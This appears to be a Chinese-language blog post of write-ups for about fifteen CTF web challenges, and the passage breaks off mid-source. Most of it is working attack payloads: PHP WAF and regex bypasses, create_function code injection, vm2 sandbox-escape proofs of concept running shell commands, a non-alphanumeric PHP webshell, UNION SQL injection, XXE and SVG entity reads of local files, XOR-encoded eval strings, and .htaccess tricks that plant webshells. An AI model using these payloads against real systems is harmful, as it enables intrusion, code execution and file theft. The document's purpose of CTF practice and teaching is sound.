color=red\u0026gt;\u0026lt;B\u0026gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!\u0026lt;/B\u0026gt;\u0026lt;br\u0026gt;\u0026lt;/font\u0026gt;\u0026#34;; if($_SERVER) { if ( preg_match(\u0026#39;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\\u0026#34;|\\\u0026#39;|log/i\u0026#39;, $_SERVER[\u0026#39;QUERY_STRING\u0026#39;]) ) die(\u0026#39;You seem to want to do something bad?\u0026#39;); } if (!preg_match(\u0026#39;/http|https/i\u0026#39;, $_GET[\u0026#39;file\u0026#39;])) { if (preg_match(\u0026#39;/^aqua_is_cute$/\u0026#39;, $_GET[\u0026#39;debu\u0026#39;]) \u0026amp;\u0026amp; $_GET[\u0026#39;debu\u0026#39;] !== \u0026#39;aqua_is_cute\u0026#39;) { $file = $_GET[\u0026#34;file\u0026#34;]; echo \u0026#34;Neeeeee! Good Job!\u0026lt;br\u0026gt;\u0026#34;; } } else die(\u0026#39;fxck you! What do you want to do ?!\u0026#39;); if($_REQUEST) { foreach($_REQUEST as $value) { if(preg_match(\u0026#39;/[a-zA-Z]/i\u0026#39;, $value)) die(\u0026#39;fxck you! I hate English!\u0026#39;); } } if (file_get_contents($file) !== \u0026#39;debu_debu_aqua\u0026#39;) die(\u0026#34;Aqua is the cutest five-year-old child in the world! Isn\u0026#39;t it ?\u0026lt;br\u0026gt;\u0026#34;); if ( sha1($shana) === sha1($passwd) \u0026amp;\u0026amp; $shana != $passwd ){ extract($_GET[\u0026#34;flag\u0026#34;]); echo \u0026#34;Very good! you know my password. But what is flag?\u0026lt;br\u0026gt;\u0026#34;; } else{ die(\u0026#34;fxck you! you don\u0026#39;t know my password! And you don\u0026#39;t know sha1! why you come here!\u0026#34;); } if(preg_match(\u0026#39;/^[a-z0-9]*$/isD\u0026#39;, $code) || preg_match(\u0026#39;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\{|\\%|x|\\\u0026amp;|\\$|\\*|\\||\\\u0026lt;|\\\u0026#34;|\\\u0026#39;|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i\u0026#39;, $arg) ) { die(\u0026#34;\u0026lt;br /\u0026gt;Neeeeee~! I have disabled all dangerous functions! You can\u0026#39;t get my flag =w=\u0026#34;); } else { include \u0026#34;flag.php\u0026#34;; $code(\u0026#39;\u0026#39;, $arg); } ?\u0026gt; 第一层\n1 2 3 4 if($_SERVER) { if ( preg_match(\u0026#39;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\\u0026#34;|\\\u0026#39;|log/i\u0026#39;, $_SERVER[\u0026#39;QUERY_STRING\u0026#39;]) ) 这一层用url编码绕过\n1 ?%73hana=1 第二层\n1 2 if (!preg_match(\u0026#39;/http|https/i\u0026#39;, $_GET[\u0026#39;file\u0026#39;])) { if (preg_match(\u0026#39;/^aqua_is_cute$/\u0026#39;, $_GET[\u0026#39;debu\u0026#39;]) \u0026amp;\u0026amp; $_GET[\u0026#39;debu\u0026#39;] !== \u0026#39;aqua_is_cute\u0026#39;) 在传入参数最后加入换行符就能绕过%0a\n1 ?%64ebu=%61qua_is_%63ute%0a 第三层\n1 2 3 if($_REQUEST) { foreach($_REQUEST as $value) { if(preg_match(\u0026#39;/[a-zA-Z]/i\u0026#39;, $value)) $_REQUEST在同时接收GET和POST参数时，POST优先级更高\n所以只需要POST相同的参数即可绕过。\n第四层\n1 if (file_get_contents($file) !== \u0026#39;debu_debu_aqua\u0026#39;) 用data伪协议或者php://input写入\n第五层\n1 if ( sha1($shana) === sha1($passwd) \u0026amp;\u0026amp; $shana != $passwd ) 数组绕过\n1 ?shana[]=1\u0026amp;passwd[]=2 第六层\n1 2 if(preg_match(\u0026#39;/^[a-z0-9]*$/isD\u0026#39;, $code) || preg_match(\u0026#39;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\{|\\%|x|\\\u0026amp;|\\$|\\*|\\||\\\u0026lt;|\\\u0026#34;|\\\u0026#39;|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i\u0026#39;, $arg) ) $code和$arg可控，利用$code('',$arg)进行create_function注入\n1 2 3 4 5 6 7 8 9 在上一阶段的extract($_GET[\u0026#34;flag\u0026#34;]);处进行变量覆盖，从而使变量$code和变量$arg可控 首先闭合原有的语句： flag[arg]=} 很多函数被禁用，先使用get_defined_vars()将所有变量与值都进行输出 flag[code]=create_function\u0026amp;flag[arg]=}var_dump(get_defined_vars());// // 等价于 function{ } var_dump(get_defined_vars());//} 得到rea1fl4g.php\n利用require()，来代替include()：\n1 flag[code]=create_function\u0026amp;flag[arg]=}require(base64_decode(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());// 得到假flag\nurl取反绕过\n1 2 3 echo urlencode(~\u0026#39;php://filter/read=convert.base64-encode/resource=rea1fl4g.php\u0026#39;); 用require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f)) 替换刚才的var_dump(get_defined_vars())被编码的部分即可。 最终payload\n1 2 3 4 5 6 7 // GET ?debu=aqua_is_cute%0a\u0026amp;file=data://text/plain,debu_debu_aqua\u0026amp;shana[]=1\u0026amp;passwd[]=2\u0026amp;flag[arg]=};require(php://filter/read=convert.base64-encode/resource=rea1fl4g.php);var_dump(get_defined_vars());//\u0026amp;flag[code]=create_function ?%64%65%62%75=%61%71%75%61_is_%63%75%74%65%0A\u0026amp;file=data://text/plain,%64%65%62%75_%64%65%62%75_%61%71%75%61\u0026amp;%73%68%61%6e%61[]=1\u0026amp;%70%61%73%73%77%64[]=2\u0026amp;%66%6c%61%67[%61%72%67]=;}require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));//\u0026amp;%66%6c%61%67[%63%6f%64%65]=create_function // POST debu=1\u0026amp;file=1 [GYCTF2020]EasyThinking 利用thinkphp6.0往session进行任意文件写入的漏洞\n构造PHPSESSID的值，改值长度为32且为string型，然后就会在/runtime/session/目录下产生一个php文件\n然后访问\n1 /runtime/session/sess_1111111111111111111111111111.php 蚁剑连接，插件绕过\n[GXYCTF2019]StrongestMind 爬虫\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import requests import re import time url = \u0026#39;http://8131dc42-f253-4d5f-b190-58956c615ca6.node5.buuoj.cn:81/\u0026#39; session = requests.session() req = session.get(url).text flag = \u0026#34;\u0026#34; for i in range(1010): try: result = re.findall(\u0026#34;\\\u0026lt;br\\\u0026gt;\\\u0026lt;br\\\u0026gt;(\\d.*?)\\\u0026lt;br\\\u0026gt;\\\u0026lt;br\\\u0026gt;\u0026#34;,req)#获取[数字] result = \u0026#34;\u0026#34;.join(result)#提取字符串 result = eval(result)#运算 print(\u0026#34;time: \u0026#34;+ str(i) +\u0026#34; \u0026#34;+\u0026#34;result: \u0026#34;+ str(result)) data = {\u0026#34;answer\u0026#34;:result} req = session.post(url,data=data).text if \u0026#34;flag{\u0026#34; in req: print(re.search(\u0026#34;flag{.*}\u0026#34;, req).group(0)[:50]) break time.sleep(0.1)#防止访问太快断开连接 except: print(\u0026#34;[-]\u0026#34;) [HFCTF2020]JustEscape 打开界面有run.php\n下面又说真的是php吗\n1 2 3 4 5 6 7 8 \u0026lt;?php if( array_key_exists( \u0026#34;code\u0026#34;, $_GET ) \u0026amp;\u0026amp; $_GET[ \u0026#39;code\u0026#39; ] != NULL ) { $code = $_GET[\u0026#39;code\u0026#39;]; echo eval(code); } else { highlight_file(__FILE__); } ?\u0026gt; 考虑到eval函数不止php有，nodejs也有\n用Error().stack看报错信息\n代码篇 - Error Stack - 《Node.js 调试指南》 - 书栈网 · BookStack\n1 run.php?code=Error().stack 1 2 3 4 5 6 7 8 9 10 11 Error at vm.js:1:1 at Script.runInContext (vm.js:131:20) at VM.run (/app/node_modules/vm2/lib/main.js:219:62) at /app/server.js:51:33 at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) at next (/app/node_modules/express/lib/router/route.js:137:13) at Route.dispatch (/app/node_modules/express/lib/router/route.js:112:3) at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) at /app/node_modules/express/lib/router/index.js:281:22 at Function.process_params (/app/node_modules/express/lib/router/index.js:335:12) vm沙箱逃逸\n用github有现成的poc\nBreakout in v3.8.3 · Issue #225 · patriksimek/vm2\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 One can break out of the sandbox via: \u0026#34;use strict\u0026#34;; const {VM} = require(\u0026#39;vm2\u0026#39;); const untrusted = \u0026#39;(\u0026#39; + function(){ TypeError.prototype.get_process = f=\u0026gt;f.constructor(\u0026#34;return process\u0026#34;)(); try{ Object.preventExtensions(Buffer.from(\u0026#34;\u0026#34;)).a = 1; }catch(e){ return e.get_process(()=\u0026gt;{}).mainModule.require(\u0026#34;child_process\u0026#34;).execSync(\u0026#34;whoami\u0026#34;).toString(); } }+\u0026#39;)()\u0026#39;; try{ console.log(new VM().run(untrusted)); }catch(x){ console.log(x); } And another more game breaking one: \u0026#34;use strict\u0026#34;; const {VM} = require(\u0026#39;vm2\u0026#39;); const untrusted = \u0026#39;(\u0026#39; + function(){ try{ Buffer.from(new Proxy({}, { getOwnPropertyDescriptor(){ throw f=\u0026gt;f.constructor(\u0026#34;return process\u0026#34;)(); } })); }catch(e){ return e(()=\u0026gt;{}).mainModule.require(\u0026#34;child_process\u0026#34;).execSync(\u0026#34;whoami\u0026#34;).toString(); } }+\u0026#39;)()\u0026#39;; try{ console.log(new VM().run(untrusted)); }catch(x){ console.log(x); } 直接用会被waf\n过滤了\n1 [\u0026#39;for\u0026#39;, \u0026#39;while\u0026#39;, \u0026#39;process\u0026#39;, \u0026#39;exec\u0026#39;, \u0026#39;eval\u0026#39;, \u0026#39;constructor\u0026#39;, \u0026#39;prototype\u0026#39;, \u0026#39;Function\u0026#39;, \u0026#39;+\u0026#39;, \u0026#39;\u0026#34;\u0026#39;,\u0026#39;\u0026#39;\u0026#39;] 官方wp是在关键字上用两个反引号绕过,然后url编码一下\n1 2 3 比如prototype变成`p`,`r`,`o`,`t`,`o`,`t`,`y`,`p`,`e` f.constructor(\u0026#34;return process\u0026#34;)(); f[[`c`,`o`,`n`,`s`,`t`,`r`,`u`,`c`,`t`,`o`,`r`][`join`](``)]([`r`,`e`,`t`,`u`,`r`,`n`,`%20`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))(); 1 /run.php?code=(()=%3E{%20TypeError[[`p`,`r`,`o`,`t`,`o`,`t`,`y`,`p`,`e`][`join`](``)][`a`]%20=%20f=%3Ef[[`c`,`o`,`n`,`s`,`t`,`r`,`u`,`c`,`t`,`o`,`r`][`join`](``)]([`r`,`e`,`t`,`u`,`r`,`n`,`%20`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))();%20try{%20Object[`preventExtensions`](Buffer[`from`](``))[`a`]%20=%201;%20}catch(e){%20return%20e[`a`](()=%3E{})[`mainModule`][[`r`,`e`,`q`,`u`,`i`,`r`,`e`][`join`](``)]([`c`,`h`,`i`,`l`,`d`,`_`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))[[`e`,`x`,`e`,`c`,`S`,`y`,`n`,`c`][`join`](``)](`cat+%2fflag`)[`toString`]();%20}%20})() 另一种办法是\n1 2 prototype `${`${`prototyp`}e`}` 把关键字全部替换成这种格式\n1 2 3 4 5 6 7 8 (function (){ TypeError[`${`${`prototyp`}e`}`][`${`${`get_proces`}s`}`] = f=\u0026gt;f[`${`${`constructo`}r`}`](`${`${`return this.proces`}s`}`)(); try{ Object.preventExtensions(Buffer.from(``)).a = 1; }catch(e){ return e[`${`${`get_proces`}s`}`](()=\u0026gt;{}).mainModule[`${`${`requir`}e`}`](`${`${`child_proces`}s`}`)[`${`${`exe`}cSync`}`](`whoami`).toString(); } })() [SUCTF 2018]GetShell 无字母数字webshell\n1 2 3 4 5 6 7 8 \u0026lt;?php $_=[]; $__=$_.$_; $_=($_==$__); $__=($_==$_); $___ = ~区[$__].~冈[$__].~区[$__].~勺[$__].~皮[$__].~针[$__]; $____ = ~码[$__].~寸[$__].~小[$__].~欠[$__].~立[$__]; $____($$__[_]); system($_POST[_]) 读环境变量\n[b01lers2020]Life on Mars sql注入\n1 /query?search=amazonis_planitia/**/union/**/select/**/1,group_concat(schema_name)/**/from/**/information_schema.schemata\u0026amp;{}\u0026amp;_=1745230942307 1 /query?search=amazonis_planitia/**/union/**/select/**/1,group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema=\u0026#39;alien_code\u0026#39; 1 /query?search=amazonis_planitia/**/union/**/select/**/1,group_concat(column_name)from/**/information_schema.columns/**/where/**/table_name=\u0026#39;code\u0026#39; 1 /query?search=amazonis_planitia/**/union/**/select/**/1,group_concat(code)from/**/alien_code.code EasyBypass ez\n1 /?comm1=\u0026#34;;sort+/fla?;\u0026#34;\u0026amp;comm2=1 [极客大挑战 2020]Roamphp1-Welcome post传\n1 roam1[]=1\u0026amp;roam2[]=2 [CSAWQual 2019]Web_Unagi 有waf的xxe,题目给格式\n1 2 3 4 5 6 7 8 9 \u0026lt;users\u0026gt; \u0026lt;user\u0026gt; \u0026lt;username\u0026gt;alice\u0026lt;/username\u0026gt; \u0026lt;password\u0026gt;passwd1\u0026lt;/password\u0026gt; \u0026lt;name\u0026gt;Alice\u0026lt;/name\u0026gt; \u0026lt;email\u0026gt;alice@fakesite.com\u0026lt;/email\u0026gt; \u0026lt;group\u0026gt;CSAW2019\u0026lt;/group\u0026gt; \u0026lt;/user\u0026gt; \u0026lt;/users\u0026gt; 直接全部变成\u0026amp;xxe;\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;?xml version=\u0026#39;1.0\u0026#39; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE users [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///flag\u0026#34; \u0026gt;]\u0026gt; \u0026lt;users\u0026gt; \u0026lt;user\u0026gt; \u0026lt;username\u0026gt;\u0026amp;xxe;\u0026lt;/username\u0026gt; \u0026lt;password\u0026gt;\u0026amp;xxe;\u0026lt;/password\u0026gt; \u0026lt;name\u0026gt;\u0026amp;xxe;\u0026lt;/name\u0026gt; \u0026lt;email\u0026gt;\u0026amp;xxe;\u0026lt;/email\u0026gt; \u0026lt;group\u0026gt;\u0026amp;xxe;\u0026lt;/group\u0026gt; \u0026lt;intro\u0026gt;\u0026amp;xxe;\u0026lt;/intro\u0026gt; \u0026lt;/user\u0026gt; \u0026lt;/users\u0026gt; 这里加的intro是能读全部的，但是被waf了，编码绕过\n1 iconv -f utf8 -t utf-16 2.xml\u0026gt;1.xml [MRCTF2020]Ezaudit php_mt_seed爆种子\n先将密钥转换\n1 2 3 4 5 6 7 8 9 10 11 str1=\u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\u0026#39; str2=\u0026#39;KVQP0LdJKRaV3n9D\u0026#39; str3 = str1[::-1] length = len(str2) res=\u0026#39;\u0026#39; for i in range(len(str2)): for j in range(len(str1)): if str2[i] == str1[j]: res+=str(j)+\u0026#39; \u0026#39;+str(j)+\u0026#39; \u0026#39;+\u0026#39;0\u0026#39;+\u0026#39; \u0026#39;+str(len(str1)-1)+\u0026#39; \u0026#39; break print(res) 1 ./php_mt_seed 36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61 然后根据题目逻辑算私钥\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php mt_srand(1775196155); //公钥 function public_key($length = 16) { $strings1 = \u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\u0026#39;; $public_key = \u0026#39;\u0026#39;; for ( $i = 0; $i \u0026lt; $length; $i++ ) $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1); return $public_key; } //私钥 function private_key($length = 12) { $strings2 = \u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\u0026#39;; $private_key = \u0026#39;\u0026#39;; for ( $i = 0; $i \u0026lt; $length; $i++ ) $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1); return $private_key; } echo public_key(); echo private_key(); ?\u0026gt; 版本要是前下算种子的版本\n然后万能密码登入\n1 2 3 crispr 1\u0026#39; or true# XuNhoueCDCGc [BSidesCF 2019]SVGMagic 利用svg标签来读flag\n1 2 3 4 5 6 7 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE note [ \u0026lt;!ENTITY file SYSTEM \u0026#34;file:///proc/self/cwd/flag.txt\u0026#34; \u0026gt; ]\u0026gt; \u0026lt;svg height=\u0026#34;200\u0026#34; width=\u0026#34;1000\u0026#34;\u0026gt; \u0026lt;text x=\u0026#34;10\u0026#34; y=\u0026#34;20\u0026#34;\u0026gt;\u0026amp;file;\u0026lt;/text\u0026gt; \u0026lt;/svg\u0026gt; /proc/self/cwd表示当前目录下运行的文件\n[ISITDTU 2019]EasyPHP 1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;?php highlight_file(__FILE__); $_ = @$_GET[\u0026#39;_\u0026#39;]; if ( preg_match(\u0026#39;/[\\x00- 0-9\\\u0026#39;\u0026#34;`$\u0026amp;.,|[{_defgops\\x7F]+/i\u0026#39;, $_) ) die(\u0026#39;rosé will not do it\u0026#39;); if ( strlen(count_chars(strtolower($_), 0x3)) \u0026gt; 0xd ) die(\u0026#39;you are so close, omg\u0026#39;); eval($_); ?\u0026gt; 1 2 3 \\x00- 0-9 匹配\\x00到空格(\\x20)，0-9的数字 \u0026#39;\u0026#34;`$\u0026amp;.,|[{_defgops 匹配这些字符 \\x7F 匹配DEL(\\x7F)字符 下面这个会统计用过的不同字符，超过13个被waf\n利用字符串异或\n先确定自己想执行的语句，比如phpinfo，然后定一个参考字符串，让phpinfo和它异或，就可以得到想要的输入，如果得到的结果不符合要求，再微调参考字符串\n1 2 3 4 5 6 p:%8f^%ff h:%97^%ff i:%96^%ff n:%91^%ff f:%99^%ff o:%90^%ff 脚本\n1 2 3 4 5 6 7 8 9 10 11 12 target = \u0026#34;phpinfo\u0026#34; standard = 0xff dicts = {} for i in target: dicts[i] = hex(ord(i)^standard).replace(\u0026#39;0x\u0026#39;,\u0026#39;%\u0026#39;) res = \u0026#39;\u0026#39; for i in target: res = res+dicts[i] print(res+\u0026#39;^\u0026#39;+\u0026#34;%ff\u0026#34;*len(target)) print(len(set(res+\u0026#39;^\u0026#39;+\u0026#34;%ff\u0026#34;*len(target)))) 1 2 print_r(scandir(\u0026#39;.\u0026#39;)) (%8f%8d%96%91%8b%a0%8d^%ff%ff%ff%ff%ff%ff%ff)((%8c%9c%9e%91%9b%96%8d^%ff%ff%ff%ff%ff%ff%ff)((%d1^%ff))); 要找到可以替换的，即在内部可以互相异或出来的，才能使重复的变少\n最后\n1 2 print_r(scandir(\u0026#39;.\u0026#39;)) (%8f%8d%9c%91%8b%a0%8d^%ff%ff%ff%ff%ff%ff%ff^%ff%ff%9b%ff%ff%ff%ff^%ff%ff%91%ff%ff%ff%ff)((%9c%9c%8d%91%9b%9c%8d^%ff%ff%ff%ff%ff%ff%ff^%9b%ff%9c%ff%ff%9b%ff^%8b%ff%8f%ff%ff%91%ff)((%d1^%ff))); 1 2 readfile(end(scandir(\u0026#39;.\u0026#39;))) ((%8D%9A%9E%9B%99%96%93%9A)^(%FF%FF%FF%FF%FF%FF%FF%FF))(((%9A%9E%9B)^(%FF%99%FF)^(%FF%96%FF)^(%FF%FF%FF))(((%8D%9E%9E%9E%9B%96%8D)^(%9A%9B%FF%99%FF%FF%FF)^(%9B%99%FF%96%FF%FF%FF)^(%FF%FF%FF%FF%FF%FF%FF))(%D1^%FF))); [羊城杯2020]easyphp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 \u0026lt;?php $files = scandir(\u0026#39;./\u0026#39;); foreach($files as $file) { if(is_file($file)){ if ($file !== \u0026#34;index.php\u0026#34;) { unlink($file); } } } if(!isset($_GET[\u0026#39;content\u0026#39;]) || !isset($_GET[\u0026#39;filename\u0026#39;])) { highlight_file(__FILE__); die(); } $content = $_GET[\u0026#39;content\u0026#39;]; if(stristr($content,\u0026#39;on\u0026#39;) || stristr($content,\u0026#39;html\u0026#39;) || stristr($content,\u0026#39;type\u0026#39;) || stristr($content,\u0026#39;flag\u0026#39;) || stristr($content,\u0026#39;upload\u0026#39;) || stristr($content,\u0026#39;file\u0026#39;)) { echo \u0026#34;Hacker\u0026#34;; die(); } $filename = $_GET[\u0026#39;filename\u0026#39;]; if(preg_match(\u0026#34;/[^a-z\\.]/\u0026#34;, $filename) == 1) { echo \u0026#34;Hacker\u0026#34;; die(); } $files = scandir(\u0026#39;./\u0026#39;); foreach($files as $file) { if(is_file($file)){ if ($file !== \u0026#34;index.php\u0026#34;) { unlink($file); } } } file_put_contents($filename, $content . \u0026#34;\\nHello, world\u0026#34;); ?\u0026gt; 这里利用到之前学习hatccess文件的作用，包含index.php,反斜杠绕过正则\n1 2 3 php_value auto_prepend_fi\\ le .htaccess #\u0026lt;?php system(\u0026#39;ls /\u0026#39;);?\u0026gt;\\ 换行用url编码一下\n1 ?filename=.htaccess\u0026amp;content=php_value%20auto_prepend_fi\\%0Ale%20.htaccess%0A%23%3C?php%20system(\u0026#39;ls%20/\u0026#39;);?%3E\\ 或者利用上次学到的.htaccess文件绕过prce限制的方法写马\n1 2 3 php_value pcre.backtrack_limit 0 php_value pcre.jit 0 # \\ 1 ?content=php_value%20pcre.backtrack_limit%200%0aphp_value%20pcre.jit%200%0a%23\\\u0026amp;f ilename=.htaccess 1 ?filename=php://filter/write=convert.base64-decode/resource=.htaccess\u0026amp;content=cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0IDAKcG hwX3ZhbHVlIHBjcmUuaml0IDAKcGhwX3ZhbHVlIGF1dG9fYXBwZW5kX2ZpbGUgLmh0YWNjZXNzCiM8P3 BocCBldmFsKCRfR0VUWzFdKTs/Plw\u0026amp;1=phpinfo(); [FireshellCTF2020]Caas c语言编译报错\n利用#include来文件包含\n1 #include \u0026#34;/etc/passwd\u0026#34; 直接包含flag\n1 #include \u0026#34;/flag\u0026#34; [HarekazeCTF2019]Avatar Uploader 1 原题给了源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 \u0026lt;?php error_reporting(0); require_once(\u0026#39;config.php\u0026#39;); require_once(\u0026#39;lib/util.php\u0026#39;); require_once(\u0026#39;lib/session.php\u0026#39;); $session = new SecureClientSession(CLIENT_SESSION_ID, SECRET_KEY); // check whether file is uploaded if (!file_exists($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;]) || !is_uploaded_file($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;])) { error(\u0026#39;No file was uploaded.\u0026#39;); } // check file size if ($_FILES[\u0026#39;file\u0026#39;][\u0026#39;size\u0026#39;] \u0026gt; 256000) { error(\u0026#39;Uploaded file is too large.\u0026#39;); } // check file type $finfo = finfo_open(FILEINFO_MIME_TYPE); $type = finfo_file($finfo, $_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;]); finfo_close($finfo); if (!in_array($type, [\u0026#39;image/png\u0026#39;])) { error(\u0026#39;Uploaded file is not PNG format.\u0026#39;); } // check file width/height $size = getimagesize($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;]); if ($size[0] \u0026gt; 256 || $size[1] \u0026gt; 256) { error(\u0026#39;Uploaded image is too large.\u0026#39;); } if ($size[2] !== IMAGETYPE_PNG) { // I hope this never happens... error(\u0026#39;What happened...? OK, the flag for part 1 is: \u0026lt;code\u0026gt;\u0026#39; . getenv(\u0026#39;FLAG1\u0026#39;) . \u0026#39;\u0026lt;/code\u0026gt;\u0026#39;); } // ok $filename = bin2hex(random_bytes(4)) . \u0026#39;.png\u0026#39;; move_uploaded_file($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;], UPLOAD_DIR . \u0026#39;/\u0026#39; . $filename); $session-\u0026gt;set(\u0026#39;avatar\u0026#39;, $filename); flash(\u0026#39;info\u0026#39;, \u0026#39;Your avatar has been successfully updated!\u0026#39;); redirect(\u0026#39;/\u0026#39;); 这里用到finfo_file检测图片类型，然后getimagesize判断文件像素大小，并且再进行一次类型判断，如果不是 png 类型就给出 flag，我们直接010构造一个只有png头的图片,去misc题里面找一个png图片，把文件头下面全删了\n[SCTF2019]Flag Shop 目录扫描robots.txt\n源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 require \u0026#39;sinatra\u0026#39; require \u0026#39;sinatra/cookies\u0026#39; require \u0026#39;sinatra/json\u0026#39; require \u0026#39;jwt\u0026#39; require \u0026#39;securerandom\u0026#39; require \u0026#39;erb\u0026#39; set :public_folder, File.dirname(__FILE__) + \u0026#39;/static\u0026#39; FLAGPRICE = 1000000000000000000000000000 ENV[\u0026#34;SECRET\u0026#34;] = SecureRandom.hex(64) configure do enable :logging file = File.new(File.dirname(__FILE__) + \u0026#39;/../log/http.log\u0026#39;,\u0026#34;a+\u0026#34;) file.sync = true use Rack::CommonLogger, file end get \u0026#34;/\u0026#34; do redirect \u0026#39;/shop\u0026#39;, 302 end get \u0026#34;/filebak\u0026#34; do content_type :text erb IO.binread __FILE__ end get \u0026#34;/api/auth\u0026#34; do payload = { uid: SecureRandom.uuid , jkl: 20} auth = JWT.encode payload,ENV[\u0026#34;SECRET\u0026#34;] , \u0026#39;HS256\u0026#39; cookies[:auth] = auth end get \u0026#34;/api/info\u0026#34; do islogin auth = JWT.decode cookies[:auth],ENV[\u0026#34;SECRET\u0026#34;] , true, { algorithm: \u0026#39;HS256\u0026#39; } json({uid: auth[0][\u0026#34;uid\u0026#34;],jkl: auth[0][\u0026#34;jkl\u0026#34;]}) end get \u0026#34;/shop\u0026#34; do erb :shop end get \u0026#34;/work\u0026#34; do islogin auth = JWT.decode cookies[:auth],ENV[\u0026#34;SECRET\u0026#34;] , true, { algorithm: \u0026#39;HS256\u0026#39; } auth = auth[0] unless params[:SECRET].nil? if ENV[\u0026#34;SECRET\u0026#34;].match(\u0026#34;#{params[:SECRET].match(/[0-9a-z]+/)}\u0026#34;) puts ENV[\u0026#34;FLAG\u0026#34;] end end if params[:do] == \u0026#34;#{params[:name][0,7]} is working\u0026#34; then auth[\u0026#34;jkl\u0026#34;] = auth[\u0026#34;jkl\u0026#34;].to_i + SecureRandom.random_number(10) auth = JWT.encode auth,ENV[\u0026#34;SECRET\u0026#34;] , \u0026#39;HS256\u0026#39; cookies[:auth] = auth ERB::new(\u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;#{params[:name][0,7]} working successfully!\u0026#39;)\u0026lt;/script\u0026gt;\u0026#34;).result end end post \u0026#34;/shop\u0026#34; do islogin auth = JWT.decode cookies[:auth],ENV[\u0026#34;SECRET\u0026#34;] , true, { algorithm: \u0026#39;HS256\u0026#39; } if auth[0][\u0026#34;jkl\u0026#34;] \u0026lt; FLAGPRICE then json({title: \u0026#34;error\u0026#34;,message: \u0026#34;no enough jkl\u0026#34;}) else auth \u0026lt;\u0026lt; {flag: ENV[\u0026#34;FLAG\u0026#34;]} auth = JWT.encode auth,ENV[\u0026#34;SECRET\u0026#34;] , \u0026#39;HS256\u0026#39; cookies[:auth] = auth json({title: \u0026#34;success\u0026#34;,message: \u0026#34;jkl is good thing\u0026#34;}) end end def islogin if cookies[:auth].nil? then 